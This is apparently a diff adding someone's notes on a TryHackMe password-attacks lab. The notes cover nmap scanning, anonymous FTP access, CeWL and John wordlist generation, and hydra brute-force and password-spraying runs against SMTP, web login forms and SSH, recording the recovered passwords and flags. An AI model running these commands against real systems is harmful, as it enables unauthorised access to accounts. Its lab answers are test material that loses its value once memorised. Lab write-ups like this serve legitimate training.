@@ -1340,3 +1340,675 @@ Open 10.10.163.182:25
 Open 10.10.163.182:80
 Open 10.10.163.182:465
 Open 10.10.163.182:587
+[~] Starting Script(s)
+[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 14:56 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:56
+Completed NSE at 14:56, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:56
+Completed NSE at 14:56, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:56
+Completed NSE at 14:56, 0.00s elapsed
+Initiating Ping Scan at 14:56
+Scanning 10.10.163.182 [2 ports]
+Completed Ping Scan at 14:56, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:56
+Completed Parallel DNS resolution of 1 host. at 14:56, 0.02s elapsed
+DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 14:56
+Scanning 10.10.163.182 [6 ports]
+Discovered open port 80/tcp on 10.10.163.182
+Discovered open port 587/tcp on 10.10.163.182
+Discovered open port 21/tcp on 10.10.163.182
+Discovered open port 22/tcp on 10.10.163.182
+Discovered open port 25/tcp on 10.10.163.182
+Discovered open port 465/tcp on 10.10.163.182
+Completed Connect Scan at 14:56, 0.20s elapsed (6 total ports)
+Initiating Service scan at 14:56
+Scanning 6 services on 10.10.163.182
+Completed Service scan at 14:57, 21.40s elapsed (6 services on 1 host)
+NSE: Script scanning 10.10.163.182.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:57
+NSE: [ftp-bounce 10.10.163.182:21] PORT response: 500 Illegal PORT command.
+Completed NSE at 14:57, 6.39s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 5.36s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+Nmap scan report for 10.10.163.182
+Host is up, received syn-ack (0.20s latency).
+Scanned at 2022-09-10 14:56:41 EDT for 34s
+
+PORT    STATE SERVICE  REASON  VERSION
+21/tcp  open  ftp      syn-ack vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.11.81.220
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:a7:30:6b:42:50:5b:71:48:f4:65:1f:bb:ec:68:08 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkZs1N3VIYfwGvzJnhrWaW26CQXUMuYKANJ9rR7nSSOesa454jN5Tu8M3T9e3l5+4YpD/EI7Mwo2bZJr0hKroWa10LsUjDGQIbWrurROm5k4MEilnR0citMvyLms2nCfANr0GmxxmW2wPSwVFIs+S23dgHLpJiUhamK7cFKLnCXTMqb7NivaaLF036hogqC5MV78CF4VQGcAR1drpeLG4JPJfbJrTn4HPYRQecKHK3jLfcOM0RgSs8hl2sVMuucDnp9+EbzNMCQLKqpRU00kZtRxpfyg7P3ozNlkmx8yaBBTJMgoQCCkdUxS9NYhTF5ZWj8CcFFrgbGaNj1iLsvy8j
+|   256 f5:e1:e9:36:2a:33:f1:28:72:db:53:d9:fd:9f:bc:a4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdw+BBBiNEnurJxLp5CgOgIFYZz8yBtDpCyrASbzqTTL3BtQSjrx75ONNF748jHaBwLJf9sZ4YRWUOUnbdSLto=
+|   256 6b:26:8c:be:aa:b9:bb:69:f1:ac:48:a0:3e:54:7d:98 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKIS8haBZspzTnXK0X2JNg7UOXYdgYUiIyEDrr6UZy2r
+25/tcp  open  smtp     syn-ack Postfix smtpd
+|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, STARTTLS, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-07T08:49:39
+| Not valid after:  2031-10-05T08:49:39
+| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
+| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
+| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
+| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
+| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
+| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
+| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
+| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
+| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
+| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
+| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
+| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
+| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
+| HCVAxfEwzLa3NwbXQw==
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+80/tcp  open  http     syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+465/tcp open  ssl/smtp syn-ack Postfix smtpd
+|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-07T08:49:39
+| Not valid after:  2031-10-05T08:49:39
+| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
+| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
+| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
+| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
+| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
+| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
+| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
+| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
+| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
+| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
+| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
+| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
+| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
+| HCVAxfEwzLa3NwbXQw==
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+587/tcp open  smtp     syn-ack Postfix smtpd
+|_smtp-commands: mail.thm.labs, PIPELINING, SIZE 10240000, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Subject Alternative Name: DNS:localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-10-07T08:49:39
+| Not valid after:  2031-10-05T08:49:39
+| MD5:   de62 d0c4 2dde e2ae b25a baff e13b 53dd
+| SHA-1: 9c46 cdca e7f0 ba52 1c94 9aaf 2dbe 9c09 50ff cf05
+| -----BEGIN CERTIFICATE-----
+| MIIC2TCCAcGgAwIBAgIUOhXLt0NbbqKtLc4qeXJABA7EubEwDQYJKoZIhvcNAQEL
+| BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIxMTAwNzA4NDkzOVoXDTMxMTAw
+| NTA4NDkzOVowFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
+| AAOCAQ8AMIIBCgKCAQEAxsH3viB1qqz6ACaeUKSklzRxt6S2PMk+loYQpZxEPC1Y
+| hD538y4scOhcUw+lxleGzyMCTKtvhaVnNslVfHYUYauV1Xx65aDAgB46Lh8dC+OA
+| 55q9JF3VsEQ+s1IX8qTHifQB/k+Pgf+X3mQRsK9vcBUaemnOOhFZOguI814ylZVf
+| KyL2X6NblHvuD+xeI5aAZVN+IZrGD2jR4y1r9ZNx5NJrO2BWG5dI30jI+cXeCiy5
+| fpc/Tzb8qvNt16HoqUONojRr8zHsWp4vMgaMf0abMapyNBWVRfNz3/+bzlVW4K72
+| JclftLI1m6yq7KXat5iv8HjkiWDs4rUl9iDeyV9AowIDAQABoyMwITAJBgNVHRME
+| AjAAMBQGA1UdEQQNMAuCCWxvY2FsaG9zdDANBgkqhkiG9w0BAQsFAAOCAQEAWxbJ
+| zAoJdrId3UaTCp5IJ5xDmp18qYhbwl9mBrBpitT35T+q9aAQwe5pv4w5TWVYMaQe
+| LoWtDryXZrLDfQF9vz3toQixYeroFAoQJUIREJcF2gJKAhGyJXKWd2I5EQsxumI4
+| zJwJ10a+X1FYo0nmtNTI7kLZxsDb/gF9nJxaulpPBoxPRPnD+r2IALilMzvXNHaY
+| LntWvUVjvqk/LeoFajoxszY/YhUIGf1Fmn0xaMvEekbtKt9VW8+VChf2IPS4zQRn
+| oRLWLrjPxeehDwEbtpNHFHWFVfd/Lvji49nLn3bLwDuYK0RY6S4A/D7qjUmSsi0Z
+| HCVAxfEwzLa3NwbXQw==
+|_-----END CERTIFICATE-----
+Service Info: Host: mail.thm.labs; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 14:57
+Completed NSE at 14:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.93 seconds
+```
+```text
+┌──(kali㉿kali)-[/tmp]
+└─$ ftp 10.10.163.182
+Connected to 10.10.163.182.
+220 (vsFTPd 3.0.3)
+Name (10.10.163.182:kali): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||39653|)
+c150 Here comes the directory listing.
+drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
+226 Directory send OK.
+ftp> cd files
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||63306|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
+226 Directory send OK.
+ftp> more flag.txt
+THM{d0abe799f25738ad739c20301aed357b}
+```
+Can you guess the FTP credentials without brute-forcing? What is the flag?
+```text
+┌──(kali㉿kali)-[~]
+└─$ tail -f /etc/john/john.conf
+```
+```text
+# include john-local.conf in local dir, it can override john.conf, john-local.conf (or any other conf file loaded)
+```
+```text
+# This is disabled by default since it's a security risk in case JtR is ever run with untrusted current directory
+#.include './john-local.conf'
+```
+```text
+# End of john.conf file.
+```
+```text
+# Keep this comment, and blank line above it, to make sure a john-local.conf
+```
+```text
+# that does not end with \n is properly loaded.
+[List.Rules:THM-Password-Attacks]
+Az"[0-9][0-9]" ^[!@]
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com
+CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ls
+armitage-tmp  Documents     multi_launcher  Public       Videos
+book.txt      Downloads     Music           stager2.bat
+clinic.lst    ftp_flag.txt  payload.hta     Sublist3r
+crunch.txt    hashctf2      Pictures        Templates
+Desktop       launcher.bat  powercat        thm.hta
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat clinic.lst                                       
+protected
+Research
+Oxytocin
+Paracetamol
+Cortisol
+appointment
+Cardiology
+February
+providing
+treatment
+commonly
+hospital
+Template
+tooplate
+Pregnancy
+Saturday
+Copyright
+Laboratory
+Departments
+Insurance
+healthier
+Exercise
+customised
+Lifestyle
+Balanced
+nutrition
+Benefits
+clinical
+innovative
+technology
+experience
+multidisciplinary
+surgeons
+researchers
+specialists
+together
+medicine
+pressing
+findings
+medicines
+treatments
+President
+Weronika
+Phillips
+released
+reaction
+connections
+stressful
+situations
+reliever
+alleviate
+referred
+response
+APPOINTMENT
+Department
+Additional
+location
+affiliated
+professionals
+establishing
+maintaining
+qualified
+physicians
+committed
+tailored
+specific
+requirements
+official
+Medicalmedical
+porttitor
+imperdiet
+vestibulum
+molestie
+Phasellus
+vulputate
+Vestibulum
+vehicula
+placerat
+venenatis
+eleifend
+Technology
+Consultant
+thmredteam
+Professional
+interdum
+condimentum
+pellentesque
+fringilla
+volutpat
+tincidunt
+Maecenas
+lobortis
+facilisis
+pulvinar
+dignissim
+Suspendisse
+Facebook
+maecenas
+voluptate
+Introducing
+Categories
+pharetra
+Curabitur
+consequat
+ultricies
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=clinic.lst --rules=THM-Password-Attacks --stdout > dict.lst
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+4200p 0:00:00:00 100.00% (2022-09-10 15:24) 17500p/s $ultricies9
+
+──(kali㉿kali)-[~]
+└─$ cat dict.lst    
+!protected00
+!Research00
+!Oxytocin00
+!Paracetamol00
+!Cortisol00
+!appointment00
+!Cardiology00
+!February00
+!providing00
+!treatment00
+!commonly00
+!hospital00
+!Template00
+!tooplate00
+!Pregnancy00
+!Saturday00
+!Copyright00
+!Laboratory00
+!Departments00
+!Insurance00
+!healthier00
+!Exercise00
+!customised00
+!Lifestyle00
+!Balanced00
+!nutrition00
+!Benefits00
+!clinical00
+!innovative00
+!technology00
+!experience00
+!multidisciplinary00
+
+.......
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -l pittman@clinic.thmredteam.com -P dict.lst smtp://10.10.163.182:25 -v
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:01:22
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 21000 login tries (l:1/p:21000), ~1313 tries per task
+[DATA] attacking smtp://10.10.163.182:25/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[25][smtp] host: 10.10.163.182   login: pittman@clinic.thmredteam.com   password: !multidisciplinary00
+[STATUS] attack finished for 10.10.163.182 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:01:45
+```
+In this question, you need to generate a rule-based dictionary from the wordlist clinic.lst in the previous task. email: pittman@clinic.thmredteam.com against 10.10.163.182:25 (SMTP).
+What is the password? Note that the password format is as follows: [symbol][dictionary word][0-9][0-9].
+Use the previously generated John rule from Offline Attacks #2 in your attack! Where [symbol]=[!@]
+*!multidisciplinary00*
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -l phillips -P clinic.lst 10.10.163.182 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:04:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task
+[DATA] attacking http-get-form://10.10.163.182:80/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php
+[80][http-get-form] host: 10.10.163.182   login: phillips   password: Paracetamol                                                                   
+[STATUS] attack finished for 10.10.163.182 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:04:33
+```
+Perform a brute-forcing attack against the phillips account for the login page at http://10.10.163.182/login-get using hydra? What is the flag?
+use the clinic.lst dictionary to find the password
+![[Pasted image 20220910150631.png]]
+![[Pasted image 20220910150551.png]]
+Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.10.163.182/login-post/. What is the flag?
+Note: use the clinic.lst dictionary in generating and expanding the wordlist!
+use John's Single-Extra rule
+```text
+┌──(kali㉿kali)-[~]
+└─$ john --wordlist=clinic.lst --rules=Single-Extra --stdout > dict2.lst
+Using default input encoding: UTF-8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+537026p 0:00:00:00 100.00% (2022-09-10 16:07) 1627Kp/s multidisciplina
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ hydra -l burgess -P dict2.lst 10.10.163.182 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:08:05
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 537026 login tries (l:1/p:537026), ~33565 tries per task
+[DATA] attacking http-post-form://10.10.163.182:80/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php
+[STATUS] 850.00 tries/min, 850 tries in 00:01h, 536176 to do in 10:31h, 16 active
+[80][http-post-form] host: 10.10.163.182   login: burgess   password: OxytocinnicotyxO                                                              
+[STATUS] attack finished for 10.10.163.182 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:10:26
+```
+![[Pasted image 20220910151136.png]]
+![[Pasted image 20220910151159.png]]
+### Password spray attack
+This task will teach the fundamentals of a password spraying attack and the tools needed to perform various attack scenarios against common online services.
+Password Spraying is an effective technique used to identify valid credentials. Nowadays, password spraying is considered one of the common password attacks for discovering weak passwords. This technique can be used against various online services and authentication systems, such as SSH, SMB, RDP, SMTP, Outlook Web Application, etc. A brute-force attack targets a specific username to try many weak and predictable passwords. While a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy. The following figure explains the concept of password spraying attacks where the attacker utilizes one common password against multiple users.
+Common weak and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.
+The current season followed by the current year (SeasonYear). For example, Fall2020, Spring2021, etc.
+The current month followed by the current year (MonthYear). For example, November2020, March2021, etc.
+Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.
+If a password complexity policy is enforced within the organization, we may need to create a password that includes symbols to fulfill the requirement, such as October2021!, Spring2021!, October2021@, etc. To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list).
+Next, we will apply the password spraying technique using different scenarios against various services, including:
+SSH
+RDP
+Outlook web access (OWA) portal
+SMB
+SSH
+Assume that we have already enumerated the system and created a valid username list.
+```text
+Hashcat
+
+           
+user@THM:~# cat usernames-list.txt
+admin
+victim
+dummy
+adm
+sammy
+```
+Here we can use hydra to perform the password spraying attack against the SSH service using the Spring2021 password.
+```text
+Hashcat
+
+           
+user@THM:~$ hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
+[INFO] Successful, password authentication is supported by ssh://10.1.1.10:22
+[22][ssh] host: 10.1.1.10 login: victim password: Spring2021
+[STATUS] attack finished for 10.1.1.10 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+```
+Note that L is to load the list of valid usernames, and -p uses the Spring2021 password against the SSH service at 10.1.1.10. The above output shows that we have successfully found credentials.
+RDP
+Let's assume that we found an exposed RDP service on port 3026. We can use a tool such as RDPassSpray to password spray against RDP. First, install the tool on your attacking machine by following the installation instructions in the tool’s Github repo. As a new user of this tool, we will start by executing the python3 RDPassSpray.py -h command to see how the tools can be used:
+```text
+Hashcat
+
+           
+user@THM:~# python3 RDPassSpray.py -h
+usage: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -U USERLIST, --userlist USERLIST
+                        Users list to use, one user per line
+  -u USER, --user USER  Single user to use
+  -p PASSWORD, --password PASSWORD
+                        Single password to use
+  -P PASSWORDLIST, --passwordlist PASSWORDLIST
+                        Password list to use, one password per line
+  -T TARGETLIST, --targetlist TARGETLIST
+                        Targets list to use, one target per line
+  -t TARGET, --target TARGET
+                        Target machine to authenticate against
+  -s SLEEP, --sleep SLEEP
+                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0
+  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
+                        Randomize the time between each authentication attempt. Please provide minimun and maximum values in seconds
+  -d DOMAIN, --domain DOMAIN
+                        Domain name to use
+  -n NAMES, --names NAMES
+                        Hostnames list to use as the source hostnames, one per line
+  -o OUTPUT, --output OUTPUT
+                        Output each attempt result to a csv file
+  -V, --verbose         Turn on verbosity to show failed attempts
+```
+Now, let's try using the (-u) option to specify the victim as a username and the (-p) option set the Spring2021!. The (-t) option is to select a single host to attack.
+```text
+user@THM:~# python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026
+[13-02-2021 16:47] - Total number of users to test: 1
+[13-02-2021 16:47] - Total number of password to test: 1
+[13-02-2021 16:47] - Total number of attempts: 1
+[13-02-2021 16:47] - [*] Started running at: 13-02-2021 16:47:40
+[13-02-2021 16:47] - [+] Cred successful (maybe even Admin access!): victim :: Spring2021!
+```
+The above output shows that we successfully found valid credentials victim:Spring2021!. Note that we can specify a domain name using the -d option if we are in an Active Directory environment.
+```text
+Hashcat
+
+           
+user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
+```
+There are various tools that perform a spraying password attack against different services, such as:
+Outlook web access (OWA) portal
+Tools:
+SprayingToolkit (atomizer.py) https://github.com/byt3bl33d3r/SprayingToolkit
+MailSniper
+https://github.com/dafthack/MailSniper
+SMB
+Tool: Metasploit (auxiliary/scanner/smb/smb_login)
+Use the following username list:
+```text
+Password spraying attack!
+
+           
+user@THM:~# cat usernames-list.txt 
+admin
+phillips
+burgess
+pittman
+guess
+```
+Perform a password spraying attack to get access to the SSH://10.10.163.182 server to read /etc/flag. What is the flag? (season+ year + special character)
+```text
+┌──(kali㉿kali)-[~]
+└─$ cat usernames-list.txt 
+admin
+phillips
+burgess
+pittman
+guess
+```
+```text
+┌──(kali㉿kali)-[~] (lots of attempts like Autumn2021@, Fall2021! and so on)
+└─$ hydra -L usernames-list.txt -p Fall2021@ ssh://10.10.163.182
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-10 16:28:02
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
+[DATA] attacking ssh://10.10.163.182:22/
+[22][ssh] host: 10.10.163.182   login: burgess   password: Fall2021@
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-10 16:28:07
+```
+```text
+┌──(kali㉿kali)-[~]
+└─$ ssh burgess@10.10.163.182      
+The authenticity of host '10.10.163.182 (10.10.163.182)' can't be established.
+ED25519 key fingerprint is SHA256:VFZHL9xKFvSA3f7JHFbVnOTfVWHDDfOyYBhO7WxW8/I.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.163.182' (ED25519) to the list of known hosts.
+burgess@10.10.163.182's password: Fall2021@
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1058-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat Sep 10 20:29:14 UTC 2022
+
+  System load:                    0.08
+  Usage of /:                     21.1% of 19.32GB
+  Memory usage:                   39%
+  Swap usage:                     0%
+  Processes:                      146
+  Users logged in:                0
+  IP address for eth0:            10.10.163.182
+  IP address for br-c0dd1805e8c7: 172.18.0.1
+  IP address for br-mailcow:      172.22.1.1
+  IP address for docker0:         172.17.0.1
+
+ * Canonical Livepatch is available for installation.
